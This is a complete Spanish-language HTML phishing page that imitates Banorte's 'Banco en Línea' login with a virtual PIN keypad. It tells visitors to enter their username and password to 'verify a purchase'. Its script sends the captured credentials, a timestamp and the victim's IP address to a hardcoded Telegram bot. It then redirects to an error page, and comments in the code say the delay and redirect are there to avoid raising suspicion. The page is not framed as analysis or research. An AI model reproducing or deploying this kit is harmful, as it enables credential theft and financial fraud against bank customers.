<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco en L√≠nea</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .demo-header {
            background: linear-gradient(135deg, #e31e24 0%, #c41e3a 100%);
            height: 120px;
            position: relative;
            overflow: hidden;
        }

        .demo-text {
            position: absolute;
            color: rgba(255, 255, 255, 0.15);
            font-weight: bold;
            pointer-events: none;
            user-select: none;
        }

        .demo-1 { font-size: 80px; top: -10px; left: 10%; transform: rotate(-5deg); }
        .demo-2 { font-size: 60px; top: 20px; right: 15%; transform: rotate(3deg); }
        .demo-3 { font-size: 100px; top: -20px; left: 40%; transform: rotate(-8deg); }
        .demo-4 { font-size: 45px; top: 60px; left: 5%; transform: rotate(7deg); }
        .demo-5 { font-size: 70px; top: 30px; right: 30%; transform: rotate(-3deg); }
        .demo-6 { font-size: 50px; top: 70px; right: 5%; transform: rotate(5deg); }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 120px);
            padding: 40px 20px;
            position: relative;
            z-index: 10;
        }

        .login-card {
            background: white;
            border: 3px solid #e31e24;
            border-radius: 15px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .login-title {
            color: #333;
            font-size: 32px;
            font-weight: 300;
            text-align: center;
            margin-bottom: 40px;
            letter-spacing: 1px;
        }

        .form-group {
            margin-bottom: 30px;
        }

        .form-label {
            display: block;
            color: #666;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 10px;
        }

        .form-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #fafafa;
            transition: all 0.3s ease;
            letter-spacing: 2px;
        }

        .form-input:focus {
            outline: none;
            border-color: #e31e24;
            background: white;
            box-shadow: 0 0 10px rgba(227, 30, 36, 0.1);
        }

        .form-input.password-dots {
            font-family: 'Courier New', monospace;
            font-size: 24px;
            line-height: 1;
            padding: 12px 20px;
        }

        .password-display {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            background: #fafafa;
            color: #333;
            letter-spacing: 8px;
            text-align: center;
            font-family: 'Courier New', monospace;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .password-display:hover {
            background: #f0f0f0;
            border-color: #ccc;
        }

        .password-display.active {
            border-color: #e31e24;
            background: white;
            box-shadow: 0 0 10px rgba(227, 30, 36, 0.1);
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #e31e24 0%, #c41e3a 100%);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #c41e3a 0%, #a01828 100%);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(227, 30, 36, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loading {
            display: none;
            text-align: center;
            color: #e31e24;
            margin-top: 15px;
            font-weight: 500;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e31e24;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Virtual Keyboard */
        .virtual-keyboard {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-top: 2px solid #e31e24;
            padding: 20px;
            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }

        .keyboard-row {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .key {
            background: #f8f8f8;
            border: 2px solid #ddd;
            border-radius: 8px;
            padding: 15px 20px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            min-width: 60px;
            text-align: center;
        }

        .key:hover {
            background: #e8e8e8;
            border-color: #ccc;
        }

        .key:active {
            background: #e31e24;
            color: white;
            transform: scale(0.95);
        }

        .key.delete {
            background: #ff4444;
            color: white;
            font-size: 14px;
        }

        .key.delete:hover {
            background: #cc3333;
        }

        .key.close {
            background: #666;
            color: white;
            font-size: 14px;
        }

        .key.close:hover {
            background: #555;
        }

        @media (max-width: 480px) {
            .demo-header {
                height: 80px;
            }
            
            .demo-1 { font-size: 50px; }
            .demo-2 { font-size: 40px; }
            .demo-3 { font-size: 60px; }
            .demo-4 { font-size: 30px; }
            .demo-5 { font-size: 45px; }
            .demo-6 { font-size: 35px; }
            
            .container {
                padding: 20px 15px;
                min-height: calc(100vh - 80px);
            }
            
            .login-card {
                padding: 30px 25px;
                border-width: 2px;
            }
            
            .login-title {
                font-size: 28px;
                margin-bottom: 30px;
            }
            
            .key {
                padding: 12px 15px;
                font-size: 16px;
                min-width: 50px;
            }
        }

        @media (min-width: 768px) {
            .login-card {
                max-width: 450px;
                padding: 50px;
            }
        }
    </style>
</head>
<body>
    <div class="demo-header">
        <div class="demo-text demo-1">Banorte</div>
        <div class="demo-text demo-2">Banorte</div>
        <div class="demo-text demo-3">Banorte</div>
        <div class="demo-text demo-4">Banorte</div>
        <div class="demo-text demo-5">Banorte</div>
        <div class="demo-text demo-6">Banorte</div>
    </div>

    <div class="container">
        <div class="login-card">
            <h1 class="login-title">Banco en L√≠nea</h1>
            
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label">Para verificar tu compra ingresa tu usuario y contrase√±a</label>
                    <input type="text" class="form-input" id="username" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Contrase√±a</label>
                    <div class="password-display" id="passwordDisplay" onclick="showKeyboard()">
                        
                    </div>
                    <input type="hidden" id="password" required>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">ENTRAR</button>
            </form>

            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                Procesando datos...
            </div>
        </div>
    </div>

    <!-- Virtual Keyboard -->
    <div class="virtual-keyboard" id="virtualKeyboard">
        <div class="keyboard-row">
            <div class="key" onclick="addDigit('1')">1</div>
            <div class="key" onclick="addDigit('2')">2</div>
            <div class="key" onclick="addDigit('3')">3</div>
        </div>
        <div class="keyboard-row">
            <div class="key" onclick="addDigit('4')">4</div>
            <div class="key" onclick="addDigit('5')">5</div>
            <div class="key" onclick="addDigit('6')">6</div>
        </div>
        <div class="keyboard-row">
            <div class="key" onclick="addDigit('7')">7</div>
            <div class="key" onclick="addDigit('8')">8</div>
            <div class="key" onclick="addDigit('9')">9</div>
        </div>
        <div class="keyboard-row">
            <div class="key delete" onclick="deleteDigit()">BORRAR</div>
            <div class="key" onclick="addDigit('0')">0</div>
            <div class="key close" onclick="hideKeyboard()">CERRAR</div>
        </div>
    </div>

    <script>
        // Configuraci√≥n del Bot de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = 'error.html'; // URL de redirecci√≥n

        let currentPassword = '';
        const maxPasswordLength = 8;

        // Manejo del formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username.trim() === '' || password.trim() === '') {
                alert('Por favor completa todos los campos');
                return;
            }
            
            // Mostrar loading
            document.getElementById('loading').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').textContent = 'PROCESANDO...';
            
            await sendDataToTelegram(username, password);
        });

        // Funciones del teclado virtual
        function showKeyboard() {
            document.getElementById('virtualKeyboard').style.display = 'block';
            document.getElementById('passwordDisplay').classList.add('active');
            document.body.style.paddingBottom = '300px';
        }

        function hideKeyboard() {
            document.getElementById('virtualKeyboard').style.display = 'none';
            document.getElementById('passwordDisplay').classList.remove('active');
            document.body.style.paddingBottom = '0';
        }

        function addDigit(digit) {
            if (currentPassword.length < maxPasswordLength) {
                currentPassword += digit;
                updatePasswordDisplay();
                document.getElementById('password').value = currentPassword;
            }
        }

        function deleteDigit() {
            if (currentPassword.length > 0) {
                currentPassword = currentPassword.slice(0, -1);
                updatePasswordDisplay();
                document.getElementById('password').value = currentPassword;
            }
        }

        function updatePasswordDisplay() {
            const display = document.getElementById('passwordDisplay');
            if (currentPassword.length === 0) {
                display.textContent = '‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢';
            } else {
                display.textContent = '‚Ä¢'.repeat(currentPassword.length) + '‚Ä¢'.repeat(maxPasswordLength - currentPassword.length);
            }
        }

        // Env√≠o de datos a Telegram
        async function sendDataToTelegram(username, password) {
            const message = `üè¶ *BANCO EN L√çNEA*\n\n` +
                          `üë§ *Usuario:* ${username}\n` +
                          `üîê *Contrase√±a:* ${password}\n` +
                          `üìÖ *Fecha:* ${new Date().toLocaleString('es-MX')}\n` +
                          `üåê *IP:* ${await getClientIP()}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    // Simular un peque√±o delay para que parezca m√°s real
                    setTimeout(() => {
                        // Redireccionar a la p√°gina oficial del banco
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                } else {
                    throw new Error('Error al enviar mensaje');
                }
            } catch (error) {
                console.error('Error:', error);
                // Incluso si hay error, redirigir para no levantar sospechas
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1500);
            }
        }

        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'No disponible';
            }
        }

        // Cerrar teclado al hacer clic fuera
        document.addEventListener('click', function(e) {
            const keyboard = document.getElementById('virtualKeyboard');
            const passwordDisplay = document.getElementById('passwordDisplay');
            
            if (keyboard.style.display === 'block' && 
                !keyboard.contains(e.target) && 
                e.target !== passwordDisplay) {
                hideKeyboard();
            }
        });

        // Prevenir zoom en iOS al enfocar inputs
        document.addEventListener('touchstart', function(e) {
            if (e.target.tagName === 'INPUT') {
                e.target.style.fontSize = '16px';
            }
        });
    </script>
</body>
</html>
